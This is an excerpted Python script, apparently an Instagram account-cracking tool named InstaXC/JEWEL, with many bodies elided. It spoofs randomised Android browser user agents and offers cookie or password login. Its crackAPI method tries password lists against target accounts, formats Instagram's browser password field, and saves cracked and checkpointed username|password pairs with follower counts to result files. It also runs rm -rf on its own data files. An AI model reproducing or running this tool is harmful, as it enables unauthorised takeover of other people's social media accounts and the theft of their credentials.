...
for tu in range(1000):
            ...
            ugens_xyaa = f'Mozilla/5.0 (Linux; U; Android {f}; {e}; {a} Build/PPR1.{i}.0{j}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{b}.0.{c}.{d} Mobile Safari/537.36 OppoBrowser/{g}.{h}.1.{h}'
...
def login_kamu():
    if "sukses" in lisensiku:
        try:
            ...
            banner()
            prints(Panel("•LOGIN METHOD"))
            prints(Panel("•[1]LOGIN USING COOKIES\n•[2]LOGIN USING USERNAME & PASSWORD"))
            loginpil=input(" INPUT CHOOSE ÷ ")
            if loginpil=='1':
                prints(Panel("•PUBLIC ACCOUNT ONLY"))
                us=input('•INPUT USERNAME ÷ ')
                cok=input('•INPUT COOKIES  ÷  ');loadinglisen()
                kuki=open('data/.kukis.log','w').write(cok)
                user=open('data/.username','w').write(us)
                prints(Panel(f"{P}LOGIN WAS SUCCESSFUL√"));exit()
            elif loginpil == '2':
                login()
        ex,user=cekAPI(kuki)
        cookie={'cookie':kuki}
...
def login():
	...
	if x.get('status')=='success':
		...
		prints(Panel("LOGIN WAS SUCCESSFUL√"));exit()
	elif x.get('status')=='checkpoint':
		prints(Panel("ACCOUNT CHECKPOINT"));exit()
		os.system("rm -rf data/.kukis.log rm -rf data/.username")
		exit()
	else:
		prints(Panel("•INCORRECT USERNAME OR PASSWORD"))
		time.sleep(2);exit()
...
class instagram:
	...
	def logo(self):
		for i in external:
			try:
				...
				pass
			banner()
			prints(Panel(f"{H2}{ng}",title=f"{P2}negara",subtitle=f"{P2}0.4",width=80,padding=(0,33),style=f"{color_table}"))
			axz.append(Panel(f"""{P2}nama akun : {H2}{nama}\n{P2}followers : {H2}{followers}\n{P2}following :{H2} {following}""",title=f"{P2}data akun",width=38,style=f"{color_table}"))
	...
	def hapus_lisensi(self):
		...
		if ask in ["y","Y"]:os.system("rm -rf data/lisensi.txt");prints(Panel(f"{P2}succeed menghapus {color_rich}'lisensi'{P2} terima kasih telah menggunakan script InstaXC",width=80,style=f"{color_table}"));time.sleep(2);exit()
	...
	def crackAPI(self,user,pas):
		...
		prog.update(des,description=f"{H2}[JEWEL]{P2} {loop}/{len(internal)} OK-:{H2}{len(success)}{P2} CP-:{K2}{len(checkpoint)}{P2}")
		prog.advance(des)
		try:
			for pw in pas:
           ...
           "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:{ts}:{pw}",
			...
			"trustedDeviceRecords": "{}"}
				...
				if 'userId' in str(xyaa_code):
					...
					print('\n')
					cetak(nel(oi, title=' JEWEL-LIVE'))
					open(f"result/success-{day}.txt","a").write(f'{user}|{pw}|{followers}|{following}\n')
					success.append(user)
					break
					...
					cetak(nel(oi, title=' JEWEL-CP'))
					open(f"result/checkpoint-{day}.txt","a").write(f'{user}|{pw}|{followers}|{following}\n')
